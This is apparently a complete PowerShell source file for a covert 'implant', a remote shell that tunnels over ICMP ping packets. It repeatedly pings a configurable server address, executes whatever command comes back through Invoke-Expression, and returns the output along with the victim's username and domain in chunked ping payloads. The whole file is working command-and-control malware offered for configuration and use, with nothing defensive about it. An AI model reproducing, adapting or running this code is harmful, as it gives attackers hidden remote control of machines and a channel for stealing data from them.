enum ImplantMessageType {
	Prompt = 0
	NeedsInstruction = 1
	CommandResultPart = 2
	CommandResultEnd = 3
}

enum ImplantState {
	WaitingForInstruction = 0
	SendingCommandResult = 1
}

enum ServerMessageType {
	NeedsPrompt = 34
	IssuingCommand = 9
	Stop = 2
	Received = 7
}

# Configure me!
$ServerIPAddress = '192.168.86.95';
$BufferSize = 1469;
$PingTimeout = 1000;

$Ping = New-Object System.Net.NetworkInformation.Ping;
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
$PingOptions.DontFragment = $true;

Function Send-ICMPMessage([ImplantMessageType]$MessageType, [Byte[]]$Data = @()) {
	$MessageBytes = @($MessageType) + $Data;
	$Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions);
	return $Reply;
}

Function Get-Prompt([string]$Status = [char]0x270D + ' ') {
	# Customize your prompt!
	return "$Status ($env:USERNAME@$env:USERDOMAIN) $((Get-Location).Path)> ";
}

[ImplantState]$State = [ImplantState]::WaitingForInstruction;
$CommandResult = "";
$CommandIndex = 0;

while ($True) {
	switch ($State) {
		WaitingForInstruction {
			$Reply = Send-ICMPMessage -MessageType NeedsInstruction;
			if ($Reply.Buffer.Count -gt 0) {
				$ServerMessageType = [ServerMessageType]$Reply.Buffer[0];
				Write-Host "Server message:" $ServerMessageType;
				switch ($ServerMessageType) {
					NeedsPrompt {
						$Prompt = Get-Prompt;
						$PromptBytes = [Text.Encoding]::UTF8.GetBytes($Prompt);
						Send-ICMPMessage -MessageType Prompt -Data $PromptBytes;
						$State = [ImplantState]::WaitingForInstruction;
						Write-Host "State:" $State;
					}
					IssuingCommand {
						$Command = [Text.Encoding]::UTF8.GetString($Reply.Buffer[1..($Reply.Buffer.Count - 1)]);
						try {
							$CommandResult = Invoke-Expression -Command $Command 2>&1 | Out-String;
						}
						catch {
							$CommandResult = $_.Exception.Message;
						}
						$CommandIndex = 0;
						$State = [ImplantState]::SendingCommandResult;
						Write-Host "State:" $State;
					}
					Stop {
						return;
					}
				}
			}
		}
		SendingCommandResult {
			$CommandResultBytes = [Text.Encoding]::UTF8.GetBytes($CommandResult);
			$ChunkSize = [Math]::Min($BufferSize, $CommandResultBytes.Count - $CommandIndex);
			$Chunk = $CommandResultBytes[$CommandIndex..($CommandIndex + $ChunkSize - 1)];
			Send-ICMPMessage -MessageType CommandResultPart -Data $Chunk | Out-Null;
			$CommandIndex += $ChunkSize;
			if ($CommandIndex -ge $CommandResultBytes.Count) {
				Send-ICMPMessage -MessageType CommandResultEnd | Out-Null;
				$State = [ImplantState]::WaitingForInstruction;
				Write-Host "State:" $State;
			}
		}
	}
	Start-Sleep 1;
}
